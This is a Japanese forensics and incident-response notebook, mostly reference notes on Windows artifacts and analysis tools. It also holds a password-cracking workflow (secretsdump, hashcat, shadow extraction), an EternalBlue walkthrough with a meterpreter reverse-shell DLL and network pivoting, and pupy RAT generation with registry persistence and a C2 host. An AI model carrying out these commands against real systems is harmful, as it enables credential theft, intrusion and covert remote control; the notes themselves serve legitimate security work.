# work

■パスワード解析
・OphCrack
http://ophcrack.sourceforge.net/
パスワードクラックツールです。SAMファイルからユーザのパスワードをクラックする場合等に利用
・hashcat
https://hashcat.net/hashcat/
gitでソースからも入手可能
https://github.com/hashcat/hashcat.git
インストール方法
http://73spica.tech/blog/hashcat_install_cpuonly/
・secretsdump
https://github.com/CoreSecurity/impacket/blob/master/examples/secretsdump.py
※secretdumpでに、hashcatで解析する
・LSAを確認※デフォルトのパスワード等が判明する場合がある。
$ python.exe examples/secretsdump.py -security ./SECURITY -system ./SYSTEM LOCAL
・NThashリスト作成
$ python.exe examples/secretsdump.py -security ./SECURITY -sam ./SAM LOCAL > hashlist.txt
・NThashでから辞書による照合
$ hashcat-3.6.0\hashcat64.exe -m 2100 -a 0 -o 【結果出力ファイル】 【NThashリスト】 【辞書ファイル】
SAM:-m 1000
SECURITY,SYSTEM：-m 2100
※Domain Cached Credentials 2 (DCC2), MS Cache 2 
※NTHashリストに"$DCC2$10240#"を付与することでhashcatが読める形になる。
　$DCC2$10240#account_name#hash
　https://github.com/hashcat/hashcat/issues/103
　
詳細はhashcatのwikiに記載。
https://hashcat.net/wiki/doku.php?id=example_hashes
・john the Ripper
・mimikatz
・CredentialsFileView
https://www.nirsoft.net/utils/credentials_file_view.html
Credentialsファイルを復号するツール
含まれる情報
LAN内リモートPCへのログインパスワード
Outlookに設定しているExchangeサーバのメールアカウントのパスワード
Windows Liveのセッション情報
リモートデスクトップ 6系のユーザ/パスワード
IE 7, 8系のBasic認証/ダイジェスト認証で保護されたWebサイトのパスワード
MSNメッセンジャー/Windowsメッセンジャーのアカウントのパスワード
Windows Vista以上
    C:\Users\[User Profile]\AppData\Roaming\Microsoft\Credentials
    C:\Users\[User Profile]\AppData\Local\Microsoft\Credentials
Windows 8以上
    C:\Windows\system32\config\systemprofile\AppData\Local\Microsoft\Credentials

・VaultPasswordView
https://www.nirsoft.net/utils/vault_password_view.html
Windows Valutに格納されているデータを復号するツール
Windows 8以上でIE10/IE11/Edgeのパスワード情報を格納している
Windows 8以上でWindows Mailのログイン情報を格納している
対象場所
    C:\Users\[User Profile]\AppData\Local\Microsoft\Vault
    C:\ProgramData\Microsoft\Vault
    C:\Windows\system32\config\systemprofile\AppData\Local\Microsoft\Vault
    C:\Users\[User Profile]\AppData\Roaming\Microsoft\Protect
    C:\Windows\system32\Microsoft\Protect

・md5解析に使用したもの
md5cracker
http://md5cracker.org/decrypted-md5-hash/098f6bcd4621d373cade4e832627b4f6
findmyhash
https://github.com/Talanor/findmyhash
md5-bruteforce
https://github.com/sefasaid/python-md5-bruteforce.git

■パスワードリセット
・chntpw
https://news.infoseek.co.jp/article/mynavi_1740613/
https://opensource.com/article/18/3/how-reset-windows-password-linux


■SSHブルートフォース
Hydra, nCrack, Medusa
ここにまとめてある
https://hackertarget.com/brute-forcing-passwords-with-ncrack-hydra-and-medusa/

■shadowファイル
echo "【shadowファイルの各ユーザーの第3パラメータ】 * 86400" |bc |xargs -i% date --date=@% パスワード最終変更日の確認
http://qiita.com/white_aspara25/items/7a7e7054d2e13d247a6d

■hashcat
・インストール、環境構築
* windows
１．ダウンロード
下記に最新のバイナリがあるので、ダウンロードする。
https://hashcat.net/hashcat/
２．解析したいハッシュ値を記載したリストファイルを作る(D:\hash.txt)
３．そのまま実行可能
（例)）D:\hashcat-4.1.0とかに置いて
コマンドプロンプトを開いて実行

* windows(GUI)
https://hashkiller.co.uk/hashcat-gui.aspx
HashcatGUI.exeを実行
windowsバイナリダウンロード後、"Hashcat Path"にバイナリを指定して実行("I'm a HashKiller")する。
コマンドの方が使いやすいけど、コマンドが苦手な人はありかもしれないです。トレーニングとかで使えそう。

* Linux
<pre>
hashcatのインストール
$ git clone https://github.com/hashcat/hashcat.git
$ cd hashcat
$ git submodule update --init
$ make
$ sudo make install
OpenCLのインストール
$ wget http://registrationcenter-download.intel.com/akdlm/irc_nas/9019/opencl_runtime_16.1.1_x64_ubuntu_6.4.0.25.tgz
$ tar zxvf opencl_runtime_16.1.1_x64_ubuntu_6.4.0.25.tgz
$ cd opencl_runtime_16.1.1_x64_ubuntu_6.4.0.25
$ sudo ./install.sh
※デフォルトでどんどんやっていけばいい。WSL（Windows Subsystem for Linux）でも問題なく動作した。
</pre>


・基本的な使い方
* Windows
コマンドプロンプト
<pre>
・32bit
hashcat32.exe -m 【ハッシュモード】 -a 【アタックモード】 -o 【結果出力ファイル】 【ハッシュリストファイル】 【辞書ファイル】
・64bit
hashcat64.exe -m 【ハッシュモード】 -a 【アタックモード】 -o 【結果出力ファイル】 【ハッシュリストファイル】 【辞書ファイル】
</pre>

* Linux
<pre>
$ hashcat -m 【ハッシュモード】 -a 【アタックモード】 -o 【結果出力ファイル】 【ハッシュリストファイル】 【辞書ファイル】
</pre>

* オプション
|オプション|説明|
|-m 【ハッシュモード】|"よく使うものを記載": |
|-a 【アタックモード】|0:辞書照合　その他は"こちらに"記載:|
|--potfile-disable|一度解析したものも再解析できる。ハッシュを結果出力し忘れた時などに使える。|


・解読試行パターン
* ハッシュモード
案件で使用頻度が高いもの
|Hash-Mode |Hash-Name |Example|
|0 |MD5 |8743b52063cd84097a65d1633f5c74f5|
|100 |SHA1 |b89eaac7e61417341b710b727768294d0e6a277b|
|300 |MySQL4.1/MySQL5 |fcf7c1b8749cf99d88e5f34271d636178fb5d130|
|400 |phpass, WordPress (MD5) |Joomla (MD5) |$P$984478476IagS59wHZvyQMArzfx58u.|
|1000 |NTLM |b4b9b02e6f09a9bd760f388b67351e2b|
|1100 |Domain Cached Credentials (DCC), MS Cache |4dd8965d1d476fa0d026722989a6b772:3060147285011|
|2100 |Domain Cached Credentials 2 (DCC2), MS Cache 2 |$DCC2$10240#tom#e4e938d12fe5974dc42a90120bd9c90f|
その他は以下に載っているので、参照
https://hashcat.net/wiki/doku.php?id=example_hashes

* アタックモード
https://hashcat.net/wiki/
Dictionary attack - trying all words in a list; also called “straight” mode (attack mode 0, -a 0)
Combinator attack - concatenating words from multiple wordlists (mode 1)
Brute-force attack and Mask attack - trying all characters from given charsets, per position (mode 3)
Hybrid attack - combining wordlists+masks (mode 6) and masks+wordlists (mode 7); can also be done with rules
Rule-based attack - applying rules to words from wordlists; combines with wordlist-based attacks (attack modes 0, 6, and 7)
Toggle-case attack - toggling case of characters; now accomplished with rules

・ユースケース
* Windows NTLM
SAMから得られた場合は"-m 1000"
※Domain Cached Credentials 2 (DCC2), MS Cache 2 の場合、NTハッシュリストに"$DCC2$10240#"を付与することでhashcatが読める形になる。
$DCC2$10240#account_name#hash
https://github.com/hashcat/hashcat/issues/103
<pre>
・LSAを確認※デフォルトのパスワード等が判明する場合がある。
$ python.exe examples/secretsdump.py -security ./SECURITY -system ./SYSTEM LOCAL
・NTハッシュリスト作成
$ python.exe examples/secretsdump.py -security ./SECURITY -sam ./SAM LOCAL > hashlist.txt
・NThashで辞書による照合
$ hashcat64.exe -m 2100 -a 0 -o result.txt hashlist.txt dazzlepod_dic.txt
</pre>

* MD5
<pre>
・md5のリスト
$echo -n "Password1" | md5sum | tr -d " -" >> hashes
$echo -n "HELLO" | md5sum | tr -d " -" >> hashes
$echo -n "MYSECRET" | md5sum | tr -d " -" >> hashes
・辞書による照合
$hashcat -m 0 -o md5-result.txt md5list.txt rockyou.txt
</pre>
※https://wiki.skullsecurity.org/Passwords にある辞書ファイルを使用

* Linux /etc/shadow
<pre>
・shadowファイル
$ sudo tail -1 /etc/shadow > shadow.txt
・ハッシュ部分を切り出す
$ cat shadow.txt |awk -F ':' '{print $2}' > shadow-hash.txt
$ hashcat -m 1800 -a 0 -o shadow-result.txt shadow-hash.txt rockyou.txt
</pre>
※https://wiki.skullsecurity.org/Passwords にある辞書ファイルを使用

* WordPress,MySQL
wp-login.phpに記載してあるmysqlのアカウントを確認
mysqlのパスワードリセット

mysqlを停止し、認証なしの状態で立ち上げる
# /etc/init.d/mysqld stop
# /usr/bin/mysqld_safe --skip-grant-tables

↑で、上がった状態になるので、別ターミナルでmysqlログインして、パスワードをリセットする
# mysql -u admin
mysql> UPDATE mysql.user SET Password=PASSWORD('【NewPassword】') WHERE User='【確認したアカウント】';
mysql> FLUSH PRIVILEGES;

wordpressパスワード解析
    解析したいハッシュ値を記載したリストファイルを作る(D:\hash.txt)

    $P$BhwqqJeTiaeHqEoryiHG0jcn4XQe.V1
    $P$BOZCrPMDlbSE7U8hxw/WAk11F.TeCr1

    解析ツール(\\fs.ad.cdilab\share\tools\hashcat\hashcat-3.6.0)を手元の環境に持ってくる(D:\hashcat-3.6.0)
    辞書ファイル(\\fs.ad.cdilab\share\dictionary\dazzlepod_dic.txt)を手元の環境に持ってくる(D:\dazzlepod_dic.txt)
    コマンドプロンプトを開いて以下を実行する

    C:\> D:
    D:\> hashcat-3.6.0\hashcat64.exe -m 400 -a 0 -o hash_result.txt hash.txt dazzlepod_dic.txt


    パスワードが判明すればhash_result.txtに結果が出力されている



■パスワード辞書、レインボーテーブル
・パスワードリスト
なくなった。
https://dazzlepod.com/site_media/txt/passwords.txt
CrackStation's Password Cracking Dictionary
https://crackstation.net/buy-crackstation-wordlist-password-cracking-dictionary.htm
https://github.com/berzerk0/Probable-Wordlists
最低なパスワードはここに乗ってる。
https://downloads.skullsecurity.org/passwords/500-worst-passwords.txt.bz2 
Probable Wordlists - Version 2.0
https://github.com/berzerk0/Probable-Wordlists
Passwords
https://wiki.skullsecurity.org/Passwords

・レインボーテーブル
http://ophcrack.sourceforge.net/tables.php
http://project-rainbowcrack.com/table.htm

■単語リストの抽出
hashcatに使える。イメージファイルから単語リストを抽出。
・bulk extractor
bulk_extractor.exe -x all -e wordlist -o test.txt 【イメージファイル】

■暗号・復号ツール
xor復号ツール
https://github.com/hellman/xortool
https://github.com/OpenSecurityResearch/unbup/blob/master/xor.pl
base64とXORなどの暗号化はここでもできる。
https://www.browserling.com/tools/xor-encrypt
LMHASH生成に使用する
https://asecuritysite.com/encryption/lmhash

■VB encoder/decoder
https://gallery.technet.microsoft.com/Encode-and-Decode-a-VB-a480d74c

■保全
・OSFClone
・FTK Imager
FTK Imagerを入れたUSBで保全作業
　１．FTK Imager.exeを管理者として実行
　２．「File」⇒「Add Evidence Item...」
　３．”Physical Drive”を選択
　４．保全先を選択
　５．読み込まれたら\\PHYSICAL DRIVE*を選択して、右クリック
　６．「Export Disk Image」をクリック
　７．「Verify images after they are created」にチェックを入れ、「Add」ボタンをクリック。
　８．イメージの保存形式を選択。通常E01形式を採用している。
　９．イメージファイルの説明を入れる。
　１０.保存先を指定
　　　ファイル名を拡張子を含めず指定
　　　「Image Fragment Size(MB)」に”0”を入力する！
　１１．終わったら写真で結果を記録
　１２．中身の確認
　　「File」⇒「Add Evidence Item...」
　　”Image File”を選択
　１３．作成したイメージファイルを選択して、Finishをクリックする。イメージを閲覧できる。
・Paladin
・Falcon
・dd
・Belkasoft Acquisition Tool

■マシンの起動
E01形式のファイルをVMDK形式にして起動
http://www.securityisfun.net/2014/06/booting-up-evidence-e01-image-using.html

■EVTX
・Event Log Viewer(Windows標準搭載)
・LPS
https://gallery.technet.microsoft.com/office/Log-Parser-Studio-cd458765
・Event Log Explorer
・FullEventLogView
http://www.nirsoft.net/utils/full_event_log_view.html
・Sigma
https://github.com/Neo23x0/sigma
・Microsoft Docs
https://github.com/MicrosoftDocs/
ここでイベントIDを調べることで詳細がわかる。
https://github.com/MicrosoftDocs/windows-itpro-docs
イベントログが壊れている場合の修復手順
１．evtをHex Editorで開く。
２．オフセット36が00でないことを確認したら、00に書き換え。
３．11 11 11 11 22 22 22 22 33 33 33 33 44 44 44 44のパターンを探し、後ろの16バイトをオフセット16から16バイト分のデータをコピーして書き換える

■Prefetch
アプリケーションの起動を高速化するための仕組み
判明するもの
 プログラム名
 　プリフェッチファイル名のハッシュ値は、独自アルゴリズムでパスから算出(MicroSoft独自)16進数8桁
　     同じファイル名なのに、ハッシュ値が違う場合、別のフォルダに置かれたもの。
 実行回数
 最後の実行日時　※Windows 8以上は7回分ぐらいの実行日時が出ているらしい。
 関係のあるファイル(10秒以内に開いたファイル)
 関係のあるフォルダ
 ボリューム情報
 
・WinPrefetchView
・tmurgent - SuperFetch Tools
http://www.tmurgent.com/appv/en/87-tools/performance-tools/141-superfetch-tools

■MFT
$MFT (Master File Table)
1レコード1024バイト
レコードの先頭FILE0
262144/1024=256レコード
1レコードで1ファイルのメタデータ(サイズ、ファイル名、タイムスタンプ、パーミッション)
レコードの中の属性情報
　0x10 - $STANDARD_INFORMATION タイムスタンプ(隠し属性など)
　0x30 - $FILE_NAME ファイル名、親フォルダ(タイムスタンプ)
　0x80 - $DATA

■UsnJrnl
$Extend\$UsnJrnl・$Jファイル
バックアップ・ウイルスチェック処理を高速化するために搭載
・山崎さんのJSAC資料
http://www.jpcert.or.jp/present/2018/JSAC2018_03_yamazaki.pdf
（参考）Change Journals
http://msdn.microsoft.com/en-us/library/windows/desktop/aa363798(v=vs.85).aspx
・NTFS Log Tracker
https://sites.google.com/site/forensicnote/ntfs-log-tracker
・UsnJrnl2Csv (mft2csv)
http://code.google.com/p/mft2csv/
・parser-usnjrnl
http://code.google.com/p/parser-usnjrnl/
・Windows標準で搭載されている機能でもできる。
C:\WINDOWS\system32>fsutil usn readjournal C: csv > C:\miya_cdi\tmp\myj

■VBR
ボリュームブートレコード(VBR)
  $BOOT
  １セクタ 512バイト
  １クラスタ4096バイト
  $MFTのビットマップで管理されている。
  未使用領域(FreeSpaceの場所に削除が情報がつまっているので、カービングに使用する。)

■VSS
・Arsenal Image Mounter
・vshadowmount
ディスイメージ(dd/E0)を物理ディスクに見せかけてからVSSを解析する
・VSS取得タイミング
　　Windows update
　　対応したツールをインストールした時
　　スケジュール(約3日に1回)
　　　タスクスケジューラーで確認。コンパネ→管理ツール→タスクスケジューラー
　　　 Windows→SystemRestore
　　通常はCドライブだけ
　　サーバ系は無効
・Shadow Explorer
http://www.shadowexplorer.com/downloads.html
　　
■カービング
foremost/scalpel
http://acidx.net/wordpress/2013/09/data-recovery-with-foremost-scalpel/

■Amcache
互換性関連の情報
最近実行したアプリケーション/プログラムに関する情報が格納されている 
　パス
　最終更新日時
　作成日時
　SHA1
　PE内部の情報

・SIFT
amcache.py Amcache.hveファイル
・AmcacheParser (https://ericzimmerman.github.io/)

■ShellBag
Windowsエクスプローラの設定を管理
C:\Users\ユーザ名\AppData\Local\Microsoft\Windows\UsrClass.dat
・Internet Evidence Finder
・ShellBags Explorer(tsv形式出力：SBECmd.exe)
・shellbags
https://github.com/williballenthin/shellbags

■UserAssist
ユーザ毎のプログラム実行履歴
NTUSER.dat
UserAssist (Software\Microsoft\Windows\CurrentVersion\Explorer\)
   ROT-13
   実行回数
   最終実行日時
   KNOWNFOLDERID
・UserAssist
https://blog.didierstevens.com/programs/userassist/
https://blog.didierstevens.com/2010/01/04/new-format-for-userassist-registry-keys/

■MRU
オープンしたファイルの履歴
　このアプリケーションでこのファイル名を開いていたなどがわかる。

■Shimcache(AppcompatCache)
プログラムの実行履歴(ShimCache/AppCompatCache)
   exe, dll, sys, bat
   最終更新日時
   フルパス
   Executedがついていれば実行されたことがあると言ってよい
   上限1024
   シャットダウンした時に更新される
   
・AppCompatCache Parser
入手先
http://binaryforay.blogspot.jp/p/software.html
ソースコード
https://github.com/EricZimmerman/AppCompatCacheParser

■レジストリ
C:\Windows\System32\config\
 SAM
 SECURITY
 SOFTWARE
 SYSTEM
C:\Users\【ユーザー名】\NTUSER.dat
C:\Users\【ユーザー名】\AppData\Local\Microsoft\Windows\UsrClass.dat
* 各説明
 SAM
 　アカウント設定
 　　ローカルユーザアカウントやグループの情報を記録している
 SECURITY
  PolAdtEv
   イベントログの監査設定
  ドメインアカウントでログオンしたキャッシュ
 SOFTWARE
  Windowsやアプリケーションの各種設定や履歴などを記録している
 SYSTEM
  システムの起動に必要な情報、デバイスに関する設定や各種サービスに関する情報などを保存している
  ControlSet
  TimeZoneInformation
  MountedDevice
  ShimCache(AppcompatCache)
  USB記憶媒体の接続履歴
  　USBSTORキー：データが保存可能なデバイスのみ記録
  　USBキー：全USBデバイスの記録
・WRR
・regedit
・regripper
・regfexport
・Encase以外のレジストリ復元ツール
https://www.tzworks.net/prototype_page.php?proto_id=3

■Regruns
・AutoRuns
入手先
https://technet.microsoft.com/ja-jp/sysinternals/bb963902.aspx
コマンドラインプログラムはautorunsc.exe
ディスクイメージであればマウントして以下のように実行して自動実行設定を一通り取得できる
autorunsc -z systemroot(D:\Windows) userprofile (D:\Users\【ユーザー名】)
ただし対象のハイブファイルのみがあるだけでは動作しないため、RECmdを使う
・RECmd
入手先
http://binaryforay.blogspot.jp/p/software.html
ソースコード
https://github.com/EricZimmerman/RECmd

■USBの履歴
・USB Forensics Tracker
・USBDeview 
http://www.nirsoft.net/utils/usb_devices_view.html

■メタデータ
fte
fteでメタデータの解析ができる。
http://www.kazamiya.net/fte

MFTレコード内の標準属性($SI)とファイル名属性($FN)で保持している。ファイル名属性は一般的に改竄されないと言われている。
・作成日時(crtime)
    ファイルが作成されたタイミングにセットされる。ファイルをコピーした場合、コピー先のファイルの作成日時はコピーした日時。
・更新日時/最終ファイル更新日時(mtime)
    ファイルのデータが更新されたタイミングに更新。ファイルをコピーした場合は更新されない。
・エントリ更新日時/最終i-node更新日時(ctime)
    ファイルのメタデータが更新されたタイミングでセットされる。ファイルを作成したりデータを更新した場合もエントリ更新日時は更新される。
    ファイルのパーミッションを変更すると、エントリ更新日時のみがパーミッション変更時点。
・アクセス日時/最終参照日時(atime)
    Windows Vistaからはファイルをオープン、参照してもアクセス日時を更新しなくなったため、Vista以降は確認不要。

■Web
・Firefox
　履歴：places.sqlite
　Cookie：cookie.sqlite
　ダウンロード履歴：downloads.sqlite
　記憶させている認証情報：signons.sqlite ※解読には、key3.dbが必要
　フォームの入力履歴：formhistory.sqlite
　Firefoxでプライベートブラウジングにしていた場合、下記情報は履歴として残らない
　　・キャッシュファイル
　　・Cookie
　　・フォームデータ
　　・ダウンロードアイテムリスト
　　・サーチバーのエントリー
　　・パスワード
　　・オートコンプリート
　　※ブックマークやダウンロードしたファイルは、プライベートモードであっても端末内に保存されます。
・BrowsingHistoryView
http://www.nirsoft.net/utils/browsing_history_view.html
・SQLite Database Browser
http://sourceforge.net/projects/sqlitebrowser/
・esedatabaseview
・IEChaceView
http://www.nirsoft.net/utils/ie_cache_viewer.html
・IECookis View
http://www.nirsoft.net/utils/iecookies.html

■メール
・Outlook
Kernel Outlook PST Viewer（フリー）
http://www.nucleustechnologies.com/download-outlook-pst-viewer.php
・Thunderbird
MiTec Mail Viewer（フリー）
http://www.mitec.cz/mailview.html
・EasyRecovery（メール修復機能、シェアウェア）
http://www.ontrack-japan.com/software/easyrecovery/
・壊れた Outlook データファイルをスキャンおよび修復する
http://office.microsoft.com/ja-jp/outlook-help/HA010075831.aspx

■画像解析
・EXIF解析ツール
EXIF Reader
http://www.rysys.co.jp/exifreader/jp/
Jpeg Analyzer Plus
http://homepage3.nifty.com/kamisaka/JpegAnalyzer/
Opanda Iexif（スタンドアローン版）
http://opanda.com/en/iexif/
Opanda Iexif for Firefox(Firefoxアドオン)
http://www.opanda.com/en/iexif/iexif_firefox.htm

・ステガノグラフィツール
JPHIDE and JPSEEK
http://www.freewr.com/freeware.php?download=jphide-and-jpseek&lid=258
OutGuess
http://www.outguess.org/download.php

■リンクファイル
Recentフォルダ内のLinkファイルには、下記の情報が記録されています。
・実の保存先（フルパス）
・実ファイルのタイムスタンプ（作成・更新・アクセス）
・サイズ（ファイルサイズ）
・ボリュームタイプ（Fixed=固定ディスク、Removable=USBメモリ等のリムーバブルディスク、CD-ROM=CDやDVD等の光学メディア、サーバの場合は空欄）
・ボリュームシリアル番号（ボリュームをフォーマットした際に、ボリュームに対して付与される値。各ボリューム毎のボリュームシリアル番号はFTK Imagerなどで確認可能です。）
・ボリューム名
・NetBIOS名（Windowsネットワークにおけるコンピュータ名）
・MACアドレス（ネットワークカードに割り当てられている固有のID番号）
Lnk File Previewer(Lnkexaminer)（フリーウェア）
URL:http://www.simplecarver.com/free/
※Path表示において、ユーザディレクトリが表示されない場合があります。
Widows File Analyzerのダウンロードページ
h\p://www.mitec.cz/wfa.html

■WebScan
nikto
SUCURI
Web Inspector
Acunetix

■Webシェルチェック
Shell Detector
https://github.com/emposha/PHP-Shell-Detector

■NetScan
SoftPerfect Network Scanner
nmap

■メモリ
kani vola
volatility
Bulk Extractor
rekall

■Powershell
・empire powershell
https://github.com/EmpireProject/Empire
⇒Empireで生成した stager dllなら、「PowerShellRunner」「wC.DoWNLOaDSTring」とか文字列が入ってる可能性あり。
⇒metasploitならWriteProcessMemory AND rundll32.exe
・power sploit
https://github.com/mattifestation/PowerSploit
・PowerShellでイベントログをtail -f のように追跡する
jeffpatton1971/Get-WinEventTail.ps1
https://gist.github.com/jeffpatton1971/a908cac57489e6ca59a6

■SRUM
Windows8から搭載された機能。アプリケーション毎のリソースが確認できる。
srum-dump
https://github.com/MarkBaggett/srum-dump

■pagefilesys
https://github.com/matonis/page_brute

■サンドボックス
exe+dll+本体などのファイルを1つのexeにまとめることができる。
http://74.cz/en/make-sfx/index.php

■攻撃ツールの一例
・ペンテストに使えるものたち。
https://github.com/danielmiessler/SecLists
・簡単にランサムウェアを作成できる
https://github.com/goliate/hidden-tear
・Struts S-045
https://github.com/nixawk/labs/blob/master/CVE-2017-5638/exploit-urllib2.py
・SkeletonKey
https://github.com/Neo23x0/SkeletonKeyScanner
SkeletonKeyとは？
ドメインコントローラ上のメモリパッチに潜んで認証をバイパスしてハッキングするマルウェア
・WMIExec
リモートホストでスクリプトを実行する
https://github.com/CoreSecurity/impacket/blob/master/examples/wmiexec.py

・metasploitでEternalblueを使用した例
https://github.com/rapid7/metasploit-framework/archive/4.14.14.zip
# Eternalblue > DoublePulser > RunDLL する時に読ませる reverse shell の　DLLを作成
$ cd metasploit-xxx
$ ./msfvenom -p windows/x64/meterpreter/reverse_tcp -f dll LHOST=【ローカルIP】 -o /tmp/r2d2.dll
作ったDLLを、fb.pyを実行するマシンのどこぞかに配置しておく。c:\temp\とか
Callbackを受け取る準備をする。
$ ./msfconsole -q -x 'use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost 【ローカルIP】; exploit'
EternalBlueの実行
https://github.com/misterch0c/shadowbroker/blob/master/windows/fb.py
python26\python.exe fb.py
use eternalblue して、targetIp とか 適当に指定。
Execute Plugins (yes) 的なことやると、Succeed になるはず。
# use doublepulser
# Architecture > x64
# Set Functionは RunDLLにする。
# DLLPayloadは、上で作った、dllを指定
execute で、meterpreter に着信する。

・pupyとmetasploitのEternalBlueを使用してインターナルネットワーク【攻撃端末⇔グローバルPC⇔インターナルPC】を攻撃した例
pupyでフォワーディング。
>> run network/forward -L 135:【攻撃対象のインターナルPCのIP】:135
>> run network/forward -L 445:【攻撃対象のインターナルPCのIP】:445
>> run network/forward -R 0.0.0.0:6969:127.0.0.1:4444
>> run network/forward -l
WiFiセグメントをeth0に追加。
ip a a 【攻撃対象のインターナルPCのIP】/24 dev eth0
メタスプロイト実行
# msfconsole
msf > resource moto.rc
resource (moto.rc)> use multi/handler
resource (moto.rc)> set payload windows/meterpreter/reverse_tcp
resource (moto.rc)> set lhost 127.0.0.1
resource (moto.rc)> set lport 4444
resource (moto.rc)> run
resource (moto.rc)> use exploit/windows/smb/eternalblue_doublepulsar
resource (moto.rc)> set payload windows/meterpreter/reverse_tcp
resource (moto.rc)> set rhost 127.0.0.1
resource (moto.rc)> set lhost 【グローバルPCのIP】
resource (moto.rc)> set lport 6969
resource (moto.rc)> set processinject spoolsv.exe
msf exploit(eternalblue_doublepulsar) > run
msf exploit(eternalblue_doublepulsar) > session -l

上記の理解を深めるには、この記事がわかりやすい。
https://n-lab.site/?p=138

・wordpressのスキャン
WPSCAN
https://github.com/wpscanteam/wpscan
例
# ruby wpscan.rb -u 【wordpressのURL】

■攻撃方法の例
・metasploit(eternalblue時に下記を使用)
msfconsole
use exploit/windows/smb/eternalblue_doublepulsar
set payload windows/meterpreter/reverse_tcp

■マルウェア解析/
・UPX
・IDA Pro free
・Immunity Debugger
・ILSpy
・Process Explorer
・Process Monitor
・resource_hacker
・BinText (無償)
http://www.mcafee.com/jp/downloads/free-tools/bintext.aspx
ファイルから文字列を取得するツールです。バイナリファイルから可読文字列を調査する場合等に利用します。
・edagrep.py(beta ver) 
https://github.com/edashin/python_scripts/blob/master/edagrep.py
マルウェアが残す文字列を検索し、ヒットした位置の周辺データを抽出するPythonスクリプトです。
・ApateDNS 1.0 (無償)
https://www.fireeye.com/services/freeware/mandiant-apatedns.html
DNS応答を制御するツールです。マルウェアを動作させる際に、偽のDNS応答を返したりする際に利用します。
・emdivi_string_decryptor.py (無償)
https://github.com/JPCERTCC/aa-tools/blob/master/emdivi_string_decryptor.py
Emdiviの検体から、暗号化された文字列をパースするPythonスクリプトです。検体のバージョン情報や、C2サーバ情報等が取得できます。
・PEView (無償)
http://wjradburn.com/software/
プログラムのヘッダ情報の参照に利用します。


■C2使用例
・Pupy
https://github.com/n1nj4sec/pupy
インスコ
$git clone https://github.com/n1nj4sec/pupy.git pupy
$cd pupy
$git submodule init
$git submodule update
$sudo apt-get install python-psutil python-netifaces python-m2crypto python-lzma liblzma5 lzma-dev python-cxx-dev
$sudo pip install -r pupy/requirements.txt
rat生成
$python pupygen.py -o agent_x86.exe -s persistence,method=registry auto_proxy 
--host 【C2URL】:443 -t http --add-proxy プロキシアドレス:ポート --no-direct
$python pupygen.py -A x64 -o agent_x64.exe -s persistence,method=registry auto_proxy 
--host 【C2URL】:443 -t http --add-proxy プロキシアドレス:ポート --no-direct

■WebShell
https://github.com/mal-project/shell
https://github.com/tennc/webshell/tree/master/caidao-shell
・高機能シェル
https://blog.netspi.com/hacking-with-jsp-shells/
https://gist.github.com/antimatter15/a2375e36f0f04dc6b3fb
⇒ https://www.akamai.com/cn/zh/multimedia/documents/report/akamai-security-advisory-web-shells-backdoor-trojans-and-rats.pdf

■ログ解析
・iLogScanner
https://www.ipa.go.jp/security/vuln/iLogScanner/index.html
・shellhack
https://www.shellhacks.com/regex-find-email-addresses-file-grep/

■マイナー
・cpuminer
https://github.com/pooler/cpuminer
https://github.com/cryptozoidberg/cpuminer-multi (forked from cpuminer)
https://github.com/hmage/cpuminer-opt (forked from cpuminer-multi)
XMRMiner(https://github.com/xmrMiner/xmrMiner)
CPUMiner-Multi(https://github.com/cryptozoidberg/cpuminer-multi)
xmrig(https://github.com/xmrig/xmrig/releases)

■スピートテスト
https://github.com/sivel/speedtest-cli

■仮想マシン
https://www.dfir.training/tools/new
https://developer.microsoft.com/en-us/windows/downloads/virtual-machines
https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/
・FLARE VM　※IE11 on Win7以上なら上記のVMで使用可能
https://www.fireeye.com/blog/threat-research/2017/07/flare-vm-the-windows-malware.html
日本語解説
http://www.wivern.com/FLARE_VM.html
⇒floss,fake-netを主に使用

■攻撃者の特定
エフェメラルポート（クライアントが通信端点に使うポート）によって、OSが特定出来る可能性がある
https://www.cymru.com/jtk/misc/ephemeralports.html

■フォレンジック関連ドキュメント
・Windows Forensic Guide
Windows 8
https://propellerheadforensics.files.wordpress.com/2012/05/thomson_windows-8-forensic-guide2.pdf
Windows 10
http://www.champlain.edu/Documents/LCDI/Windows%2010%20Forensics.pdf

■役に立つ外部資料
フォレンジック基礎資料
https://www.soliton.co.jp/products/forensic/201504-ForensicsReference.pdf
ファストフォレンジック
https://digitalforensic.jp/2018/02/16/tech-14-4/
JPCERT/CCのツール分析
https://jpcertcc.github.io/ToolAnalysisResultSheet_jp/
CSIRT資料 実体調査
https://www.ipa.go.jp/files/000058850.pdf
CSIRTマテリアル
https://www.jpcert.or.jp/csirt_material/
証拠収集とアーカイビングのためのガイドライン
http://www.ipa.go.jp/security/rfc/RFC3227JA.html
　優先度の高いデータから順番に解析
　　イベントログ
　　プリフェッチ
　　レジストリ
　　ジャーナル
　　メタデータ
　　インターネット
　　メモリ
    ※揮発性順序とは対応しない点
PHPグローバル・リスク分析
https://thinktank.php.co.jp/policy/4308/
総務省 IoTセキュリティ対策に関する公言
http://www.soumu.go.jp/main_sosiki/kenkyu/cybersecurity_taskforce/index.html
サイバーインシデント緊急対応企業一覧
http://www.jnsa.org/emergency_response/
ディスクイメージの作成や、書き込み防止装置などの検証を実施している
http://www.cit.nist.gov/index.html

■コマンドメモ
nmap -sC --max-retries=1 -p- 【IP】 -Pn　ポートスキャン
nmap -v -O -sV -p0-65535 host すべてのTCPポートをバージョン情報まで経過を表示しながら調べる
nmap -p- -Pn --script=+rmi-vuln-classloader 【IP】 nmapでrmi確認
nmap -n -v -sC -p- --max-retries=1 【IP】　nmapはtop 1000くらいしかデフォでやらない。
nikto -h host ウェブサーバのスキャン
pwdump host ウィンドウズのパスワードハッシュを取得する
for i in $(seq 0 3);do dd if=/dev/mtdblock${i} | nc 10.10.10.1 1000${i};done　IoTデバイスの保全
ip r a 【ip】.0/24 via 【ゲートウェイ】　ipを追加して、ゲートウェイを設定
iptables -t nat -A POSTROUTING -o wlan0 -s 【ip】.0/24 -j MASQUERADE nat設定
・windowsでの探索例
for /l %i in (1,1,254)do ping -w 1 -n 1 192.168.1.%i && arp -a 192.168.1.%i

■役に立つ無料外部サービス
・Virustotal
https://www.virustotal.com/ja/
・shodan
https://www.shodan.io/
・Censys
https://censys.io/
IPAで比較している資料がある。
https://www.ipa.go.jp/files/000052712.pdf
・baidu
http://www.baidu.com/baidu.html?from=noscript
・Malwr
https://malwr.com/
・HYBRID ANALYSIS
https://www.hybrid-analysis.com/
・Insecam
http://www.insecam.org/
・dnstwister
